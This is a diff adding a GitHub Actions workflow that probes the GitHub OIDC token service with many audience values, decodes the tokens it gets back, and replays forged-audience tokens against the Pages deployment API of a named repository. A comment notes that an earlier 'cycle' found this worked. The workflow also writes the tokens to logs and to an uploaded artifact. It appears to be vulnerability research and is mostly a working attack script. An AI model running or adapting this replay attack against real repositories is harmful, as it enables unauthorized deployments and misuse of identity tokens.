@@ -1,0 +1,111 @@
+name: C10 OIDC Audience Probe
+on:
+  workflow_dispatch:
+  push:
+    branches: [c10-oidc]
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+  actions: read
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - run: |
+          mkdir out
+          echo "<h1>c10-oidc</h1>" > out/index.html
+      - uses: actions/upload-pages-artifact@v3
+        with:
+          path: out
+
+  oidc-probe:
+    needs: build
+    runs-on: ubuntu-latest
+    environment:
+      name: github-pages
+    steps:
+      - name: Probe OIDC audiences and replay
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set -x
+          mkdir -p /tmp/c10
+
+          # Audiences to probe
+          AUDS=(
+            "https://github.com/fox32932"
+            "nobody"
+            "https://github.com/fox32932/pages-test-cycle9-b"
+            "https://github.com/foo"
+            "x"
+            ""
+            "https://npm.pkg.github.com"
+            "sigstore"
+            "api://AzureADTokenExchange"
+          )
+
+          for AUD in "${AUDS[@]}"; do
+            SAFE=$(echo "$AUD" | tr -c 'a-zA-Z0-9' '_')
+            URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
+            if [ -n "$AUD" ]; then
+              URL="${URL}&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$AUD")"
+            fi
+            echo "=== Requesting audience='$AUD' (safe=$SAFE) ==="
+            RESP=$(curl -sS -X GET -H "User-Agent: actions/oidc-client" \
+              -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+              "$URL")
+            echo "$RESP" > /tmp/c10/oidc_resp_${SAFE}.json
+            TOKEN=$(echo "$RESP" | python3 -c "import json,sys;d=json.load(sys.stdin);print(d.get('value',''))" 2>/dev/null || echo "")
+            if [ -n "$TOKEN" ]; then
+              echo "$TOKEN" > /tmp/c10/oidc_token_${SAFE}.jwt
+              # Decode payload
+              PAYLOAD=$(echo "$TOKEN" | cut -d. -f2)
+              python3 -c "
+import base64, json, sys
+p = sys.argv[1]
+p += '=' * (-len(p) % 4)
+print(json.dumps(json.loads(base64.urlsafe_b64decode(p)), indent=2))
+" "$PAYLOAD" > /tmp/c10/oidc_payload_${SAFE}.json
+              cat /tmp/c10/oidc_payload_${SAFE}.json
+            else
+              echo "NO TOKEN: $RESP"
+            fi
+            sleep 1
+          done
+
+          # Now: REPLAY a forged-audience token against deploy-pages for repo A
+          # using a token that has aud=nobody (cycle 9 noted this worked)
+          ARTIFACT_ID=$(curl -s -H "Authorization: bearer $GH_TOKEN" \
+            "https://api.github.com/repos/fox32932/pages-test-cycle9/actions/runs/$GITHUB_RUN_ID/artifacts" \
+            | python3 -c "import json,sys;d=json.load(sys.stdin);print(d['artifacts'][0]['id'])")
+          echo "artifact_id: $ARTIFACT_ID"
+
+          # Replay with various audience tokens against fox32932/pages-test-cycle9 deploy
+          for SAFE in nobody x https___github_com_foo https___npm_pkg_github_com sigstore api__AzureADTokenExchange; do
+            TF="/tmp/c10/oidc_token_${SAFE}.jwt"
+            if [ -f "$TF" ]; then
+              T=$(cat "$TF")
+              echo "=== Replay audience=$SAFE against deploy-pages ==="
+              BODY=$(printf '{"artifact_id":%s,"pages_build_version":"c10-replay-%s","oidc_token":"%s"}' "$ARTIFACT_ID" "$SAFE" "$T")
+              curl -sS -X POST \
+                -H "Authorization: bearer $GH_TOKEN" \
+                -H "Accept: application/vnd.github+json" \
+                "https://api.github.com/repos/fox32932/pages-test-cycle9/pages/deployment" \
+                -d "$BODY" \
+                -w "\nHTTP %{http_code}\n" > /tmp/c10/replay_${SAFE}.txt 2>&1
+              cat /tmp/c10/replay_${SAFE}.txt
+              sleep 2
+            fi
+          done
+
+          # Tar everything and upload as artifact for offline review
+          tar czf /tmp/c10_artifacts.tar.gz -C /tmp c10
+
+      - name: Upload probe artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: c10-oidc-probe
+          path: /tmp/c10_artifacts.tar.gz
+          retention-days: 1
